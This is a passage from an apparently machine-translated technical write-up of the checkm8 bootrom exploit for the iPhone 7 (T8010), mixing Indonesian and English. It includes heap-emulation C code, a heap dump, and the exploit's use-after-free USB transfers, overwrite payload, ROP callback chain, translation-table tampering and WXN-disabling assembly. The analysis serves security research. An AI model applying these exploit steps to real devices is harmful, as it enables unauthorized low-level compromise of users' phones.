</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p>  Output dari program dengan 8 permintaan pada tahap <code>heap feng-shui</code> : </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p>  Seperti yang Anda lihat, <code>usb_device_io_request</code> lain akan muncul pada offset <code>0x5c0</code> dari awal buffer sebelumnya, yang sesuai dengan kode exploit: </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>  Anda dapat memeriksa validitas kesimpulan ini dengan menganalisis status tumpukan <code>SecureRAM</code> , yang kami dapatkan dengan <code>checkm8</code> .  Untuk tujuan ini, kami menulis skrip sederhana yang mem-parsing timbunan tumpukan dan menghitung potongan.  Perlu diingat bahwa selama <code>usb_device_io_request</code> meluap, bagian dari metadata rusak, jadi kami lewati selama analisis. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): # skipping damaged chunks this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>  Output skrip dengan komentar dapat ditemukan di bawah spoiler.  Anda dapat melihat bahwa byte pesanan rendah cocok dengan hasil emulasi. </p><br><div class="spoiler">  <b class="spoiler_title">Hasil penguraian tumpukan di SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p> You can also achieve an interesting effect by overflowing the configuration descriptors <code>High Speed</code> and <code>Full Speed</code> that are located right after the <code>IO</code> buffer. One of the fields of a configuration descriptor is responsible for its overall length. By overflowing this field, we can read beyond the descriptor. You can try and do it yourself by modifying the exploit. </p><br><h2 id="2-allocation-and-freeing-of-the-io-buffer-without-clearing-the-global-state"> 2. Allocation and freeing of the IO buffer without clearing the global state </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p> At this stage, an incomplete <code>OUT</code> request for uploading the image is created. At the same time, a global state is initialized, and the address of the buffer in the heap is written to the <code>io_buffer</code> . Then, <code>DFU</code> is reset with a <code>DFU_CLR_STATUS</code> request, and a new iteration of <code>DFU</code> begins. </p><br><h2 id="3-overwriting-usb_device_io_request-in-the-heap-with-use-after-free"> 3. Overwriting <code>usb_device_io_request</code> in the heap with <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, a <code>usb_device_io_request</code> type object is allocated in the heap, and it is overflown with <code>t8010_overwrite</code> , whose content was defined at the first stage. </p><br><p> The values of <code>t8010_nop_gadget</code> and <code>0x1800B0800</code> should overflow the fields <code>callback</code> and <code>next</code> of the <code>usb_device_io_request</code> structure. </p><br><p> <code>t8010_nop_gadget</code> is shown below and conforms to its name, but besides function return, the previous <code>LR</code> register is restored, and because of that the call <code>free</code> is skipped after the <code>callback</code> function in <code>usb_core_complete_endpoint_io</code> . This is important, because we damage the heap's metadata due to overflow, which would affect the exploit in case of a freeing attempt. </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code> points to <code>INSECURE_MEMORY + 0x800</code> . Later, <code>INSECURE_MEMORY</code> will store the exploit's payload, and at the offset of <code>0x800</code> in the payload, there is a <code>callback-chain</code> , which we'll discuss later on. </p><br><h2 id="4-placing-the-payload"> 4. Placing the payload </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, every following packet is put into the memory area allocated for the image. The payload looks like this: </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode # initializing shell-code ... 0x1800B0180: t8010_handler # new usb request handler ... 0x1800B0400: 0x1000006a5 # fake translation table descriptor # corresponds to SecureROM (0x100000000 -&gt; 0x100000000) # matches the value in the original translation table ... 0x1800B0600: 0x60000180000625 # fake translation table descriptor # corresponds to SecureRAM (0x180000000 -&gt; 0x180000000) # matches the value in the original translation table 0x1800B0608: 0x1800006a5 # fake translation table descriptor # new value translates 0x182000000 into 0x180000000 # plus, in this descriptor,there are rights for code execution 0x1800B0610: disabe_wxn_arm64 # code for disabling WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-execution-of-callback-chain"> 5. Execution of <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> After <code>USB</code> reset, the loop of canceling incomplete <code>usb_device_io_request</code> in the queue by going through a linked list is started. In the previous stages, we replaced the rest of the queue, which allows us to control the <code>callback</code> chain. To build this chain, we use this gadget: </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18↑j bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48↑j bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> As you can see, at the offset of <code>0x70</code> from the pointer to the structure, the call's address and its first argument are loaded. With this gadget, we can easily make any <code>f(x)</code> type calls for arbitrary <code>f</code> and <code>x</code> . </p><br><p> The entire call chain can be easily emulated with <code>Unicorn Engine</code> . We did it with our modified version of the plugin <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p> The results of the entire chain for <code>iPhone 7</code> can be found below. </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p> Clearing and invalidating the processor's cache at a virtual address. This will make the processor address our payload later. </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p> A memory barrier that guarantees the completion of all operations with the memory done before this instruction. Instructions in high-performance processors can be executed in an order different from the programmed one for the purpose of optimization. </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p> Then, interrupts are masked for the atomic execution of further operations. </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> A new value of the table register <code>TTBR0_EL1</code> is set in <code>0x1800B0000</code> . It is the address of <code>INSECURE MEMORY</code> where the exploit's payload is stored. As was mentioned before, the translation descriptors are located at certain offsets in the payload: </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p> The translation table is invalidated in order to translate addresses according to our new translation table. </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64">  5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p> <code>WXN</code> (Write permission implies Execute-never) is disabled to allow us execute code in <code>RW</code> memory. The execution of 